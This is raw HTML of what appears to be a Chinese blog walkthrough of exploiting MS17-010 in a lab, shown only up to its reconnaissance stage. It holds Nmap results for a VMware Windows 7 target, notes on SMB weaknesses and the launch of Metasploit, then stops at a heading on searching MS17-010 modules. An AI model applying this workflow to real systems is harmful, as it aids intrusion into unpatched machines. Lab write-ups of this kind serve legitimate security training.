&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png"
width="867"
height="626"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6_hu_aa79e7e1bdfa8979.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6_hu_fe78ea29aece5c50.png 1024w"
loading="lazy"
alt="6"
class="gallery-image"
data-flex-grow="138"
data-flex-basis="332px"
&gt;&lt;/p&gt;
&lt;h4 id="四nmap扫描结果分析"&gt;四、Nmap扫描结果分析
&lt;/h4&gt;&lt;p&gt;上述Nmap扫描结果如下所示：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
&lt;/span&gt;&lt;span class="lnt"&gt;39
&lt;/span&gt;&lt;span class="lnt"&gt;40
&lt;/span&gt;&lt;span class="lnt"&gt;41
&lt;/span&gt;&lt;span class="lnt"&gt;42
&lt;/span&gt;&lt;span class="lnt"&gt;43
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ nmap -n -sV -sC -T4 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.95 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 02:51 UTC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00047s latency&lt;span class="o"&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Not shown: &lt;span class="m"&gt;991&lt;/span&gt; closed tcp ports &lt;span class="o"&gt;(&lt;/span&gt;reset&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;135/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;445/tcp open microsoft-ds Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; microsoft-ds &lt;span class="o"&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49152/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49153/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49154/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49155/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49156/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;49157/tcp open msrpc Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MAC Address: 00:0C:29:10:6D:B7 &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service Info: Host: ANKH-PC&lt;span class="p"&gt;;&lt;/span&gt; OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host script results:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb-os-discovery:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; OS: Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise 6.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; OS CPE: cpe:/o:microsoft:windows_7::-
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Computer name: Ankh-PC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; NetBIOS computer name: ANKH-PC&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Workgroup: WORKGROUP&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ System time: 2025-12-31T10:52:28+08:00
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_nbstat: NetBIOS name: ANKH-PC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:0c:29:10:6d:b7 &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb2-time:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; date: 2025-12-31T02:52:28
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ start_date: 2025-12-31T02:41:52
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb-security-mode:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; account_used: guest
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; authentication_level: user
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; challenge_response: supported
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; smb2-security-mode:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; 2:1:0:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ Message signing enabled but not required
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 69.41 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;靶机信息&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IP地址&lt;/strong&gt;：10.0.0.17&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;主机状态&lt;/strong&gt;：在线（延迟 0.00047s）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Windows 7 Enterprise 7600 (版本 6.1)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;主机名&lt;/strong&gt;：ANKH-PC&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;工作组&lt;/strong&gt;：WORKGROUP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MAC地址&lt;/strong&gt;：00:0C:29:10:6D:B7 (VMware 虚拟机)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;系统时间&lt;/strong&gt;：UTC+8 (北京时间)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;开放端口与服务&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;135/tcp&lt;/strong&gt; - Microsoft Windows RPC (MSRPC)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;139/tcp&lt;/strong&gt; - Microsoft Windows NetBIOS-SSN&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;445/tcp&lt;/strong&gt; - Microsoft-DS (SMB)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Windows 7 Enterprise 7600&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;工作群组：WORKGROUP&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;49152-49157/tcp&lt;/strong&gt; - Microsoft Windows RPC (MSRPC)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SMB安全评估&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;身份验证级别&lt;/strong&gt;：用户级&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;消息签名&lt;/strong&gt;：已启用但非必需（默认配置）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;签名状态&lt;/strong&gt;：已禁用（存在风险，但为默认设置，可能面临中间人攻击风险）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;尝试账户&lt;/strong&gt;：guest&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="metasploit扫描与漏洞利用"&gt;Metasploit扫描与漏洞利用
&lt;/h3&gt;&lt;h4 id="一启动metasploit框架root"&gt;一、启动Metasploit框架（root）：
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;root㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─# msfconsole
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Metasploit tip: Save the current environment with the save command,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;future console restarts will use this environment again
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +-------------------------------------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; METASPLOIT by Rapid7 &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---------------------------+---------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; __________________ &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt;c&lt;span class="o"&gt;(&lt;/span&gt;______&lt;span class="o"&gt;(&lt;/span&gt;o&lt;span class="o"&gt;(&lt;/span&gt;______&lt;span class="o"&gt;(&lt;/span&gt;_&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="o"&gt;======[&lt;/span&gt;*** &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;)=&lt;/span&gt;&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; EXPLOIT &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_____________&lt;span class="se"&gt;\_&lt;/span&gt;______ &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="o"&gt;==[&lt;/span&gt;msf &amp;gt;&lt;span class="o"&gt;]============&lt;/span&gt;&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;______________________&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // RECON &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)(&lt;/span&gt;@&lt;span class="o"&gt;)&lt;/span&gt;/ &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; // &lt;span class="se"&gt;\\&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ********************* &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---------------------------+---------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; o O o &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\&amp;#39;\/\/\/&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/ |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | o O | )======( |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | o | .&amp;#39;&lt;/span&gt; LOOT &lt;span class="s1"&gt;&amp;#39;. |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | |^^^^^^^^^^^^^^|l___ | / _||__ \ |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | | PAYLOAD |&amp;#34;&amp;#34;\___, | / (_||_ \ |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | |________________|__|)__| | | __||_) | |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | |(@)(@)&amp;#34;&amp;#34;&amp;#34;**|(@)(@)**|(@) | &amp;#34; || &amp;#34; |
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; | = = = = = = = = = = = = | &amp;#39;&lt;/span&gt;--------------&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; +---------------------------+---------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;=[&lt;/span&gt; metasploit v6.4.69-dev &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ -- --&lt;span class="o"&gt;=[&lt;/span&gt; &lt;span class="m"&gt;2529&lt;/span&gt; exploits - &lt;span class="m"&gt;1302&lt;/span&gt; auxiliary - &lt;span class="m"&gt;432&lt;/span&gt; post &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ -- --&lt;span class="o"&gt;=[&lt;/span&gt; &lt;span class="m"&gt;1672&lt;/span&gt; payloads - &lt;span class="m"&gt;49&lt;/span&gt; encoders - &lt;span class="m"&gt;13&lt;/span&gt; nops &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ -- --&lt;span class="o"&gt;=[&lt;/span&gt; &lt;span class="m"&gt;9&lt;/span&gt; evasion &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Metasploit Documentation: https://docs.metasploit.com/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id="二搜索ms17-010相关模块"&gt;二、搜索ms17-010相关模块：
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
